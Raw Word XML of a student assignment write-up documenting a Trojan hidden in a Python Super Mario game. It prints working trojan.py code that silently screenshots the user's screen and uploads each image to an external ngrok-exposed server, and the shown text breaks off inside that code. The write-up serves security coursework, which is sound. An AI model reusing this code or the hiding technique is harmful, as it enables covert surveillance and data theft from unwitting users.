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7FAF9" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000" w:rsidP="00126B71">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>COSC3796 – Assignment 2 Documentation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B3DD7F" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000" w:rsidP="00126B71">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Insertion of Trojan Inside Python Super Mario Game</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E52284" w14:textId="77777777" w:rsidR="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00EEA59F" w14:textId="104A3909" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Student: </w:t>
      </w:r>
      <w:r w:rsidR="00126B71" w:rsidRPr="00126B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Tavleen </w:t>
      </w:r>
      <w:r w:rsidR="00126B71" w:rsidRPr="00B205EC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Kaur </w:t>
      </w:r>
      <w:r w:rsidR="00B205EC" w:rsidRPr="00B205EC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>(239621590)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5481FA" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Instructor: Syed Muhammed Danish</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0B3D05" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>TA: Annas Furquan Pasha</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2930CF05" w14:textId="44E21670" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">GitHub Repo: </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidR="00126B71" w:rsidRPr="00126B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/tavle</w:t>
        </w:r>
        <w:r w:rsidR="00126B71" w:rsidRPr="00126B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
        <w:r w:rsidR="00126B71" w:rsidRPr="00126B71">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>n2/Super-mario-game</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5082C35D" w14:textId="61E57651" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">YouTube Demo: </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidR="00B205EC" w:rsidRPr="00B205EC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://youtu.be/tFxCmpZ</w:t>
        </w:r>
        <w:r w:rsidR="00B205EC" w:rsidRPr="00B205EC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
        <w:r w:rsidR="00B205EC" w:rsidRPr="00B205EC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>2Zc</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="460E95E0" w14:textId="77777777" w:rsidR="00126B71" w:rsidRDefault="00126B71"/>
    <w:p w14:paraId="438DAABD" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Project Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDBFA57" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">For this assignment, I modified the open-source Python Super Mario project and inserted a Trojan that silently captures screenshots of the user’s system at regular intervals. These screenshots are automatically uploaded to an external server that displays them on an index.html page. The server was exposed publicly using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> as required.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3C409E" w14:textId="77777777" w:rsidR="00B205EC" w:rsidRDefault="00B205EC"/>
    <w:p w14:paraId="0E1FA1BE" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Trojan Functionality (What It Does)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8CAA19" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The malicious code performs the following actions:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>1. Takes screenshots every 5 seconds.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Sends</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> each screenshot to an external server using </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ngrok-exposed URL.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Continues</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> sending screenshots even after the game window is closed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC4C086" w14:textId="77777777" w:rsidR="00B205EC" w:rsidRDefault="00B205EC"/>
    <w:p w14:paraId="25666424" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Exact Location of the Malicious Code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3240CC77" w14:textId="152E91BC" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Exact Location: Inside the main game loop, after event-handling logic</w:t>
      </w:r>
      <w:r w:rsidR="00126B71">
        <w:t>, trojan.py, server.py also modified</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AF45B8" w14:textId="39DC93FA" w:rsidR="00CC5AC5" w:rsidRPr="00126B71" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00126B71" w:rsidRPr="00126B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">trojan.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA33F91" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pyautogui</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="70CA818D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D9035F" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576324CF" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from PIL import Image</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1187F61D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>import io</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F97301" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>import threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BDB73F" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pygetwindow</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>gw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  #</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> For window management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342BA31C" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="091D3DFF" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># Function to take a screenshot and send it to the server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E0046D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>send_screenshot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A16AA8E" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6299E512" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        screenshot = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pyautogui.screenshot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F5DB6D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        buffer = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>io.BytesIO</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EFB00D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>screenshot.save</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(buffer, format="PNG")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5441B930" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>img_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>buffer.getvalue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786A57CD" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>requests.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>, files</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>={</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">'file': ('screenshot.png', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>img_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>, 'image/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>')})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B74CDC" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>f"Screenshot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> sent. Status code: {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>response.status</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>")  #</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Debug print</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0C5149" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>response.status</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0C9754A9" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249783AE" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>f"Error</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> sending screenshot: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A36B19" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>        return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F508377" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ED0167E" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t># Function to start the trojan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFBA456" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>start_trojan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DC326F" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1187B933" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(30</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)  #</w:t>
      </w:r>
